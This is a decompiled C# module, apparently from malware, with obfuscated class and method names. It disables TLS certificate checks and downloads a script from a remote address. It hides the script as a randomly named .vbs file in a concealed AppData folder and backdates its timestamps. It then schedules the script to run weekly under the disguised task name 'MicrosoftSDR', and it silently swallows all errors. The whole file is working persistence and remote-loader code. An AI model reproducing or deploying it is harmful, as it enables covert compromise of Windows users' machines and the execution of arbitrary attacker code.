using System;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns14;
using ns21;

namespace ns23;

public class GClass22
{
	public static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static void smethod_0()
	{
		try
		{
			if (Operators.CompareString(Class0.smethod_6("Updater"), (string)null, false) == 0)
			{
				smethod_1();
				Class0.smethod_9("Updater", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_1()
	{
		try
		{
			ServicePointManager.ServerCertificateValidationCallback = Class0.smethod_16;
			string text = "";
			Random random = new Random();
			int num = 1;
			do
			{
				text += Conversions.ToString(Strings.ChrW(64 + random.Next(1, 26)));
				num++;
			}
			while (num <= 10);
			string string_ = GClass20.string_39;
			WebClient webClient = new WebClient();
			string value = webClient.DownloadString(string_);
			if (Operators.CompareString(GClass20.string_39, "", false) != 0 && GClass20.bool_16)
			{
				string text2 = text + ".vbs";
				string text3 = string_0 + "\\Protect";
				if (!Directory.Exists(text3))
				{
					Directory.CreateDirectory(text3);
				}
				string text4 = Conversions.ToString(2);
				StreamWriter streamWriter = new StreamWriter(text3 + "\\" + text2);
				streamWriter.WriteLine("");
				streamWriter.WriteLine(value);
				streamWriter.Close();
				FileSystem.SetAttr(text3 + "\\" + text2, (FileAttribute)Conversions.ToInteger(text4));
				File.SetCreationTime(text3 + "\\" + text2, GClass20.dateTime_0);
				Directory.SetLastAccessTime(text3 + "\\" + text2, GClass20.dateTime_1);
				FileSystem.SetAttr(text3 + "\\", (FileAttribute)Conversions.ToInteger(text4));
				Thread.Sleep(1000);
				Interaction.Shell("schtasks /create /f /sc weekly /mo 1 /d FRI /tn MicrosoftSDR /tr \"" + text3 + "\\" + text2, (AppWinStyle)0, false, -1);
				Class0.smethod_21(text3 + "\\");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
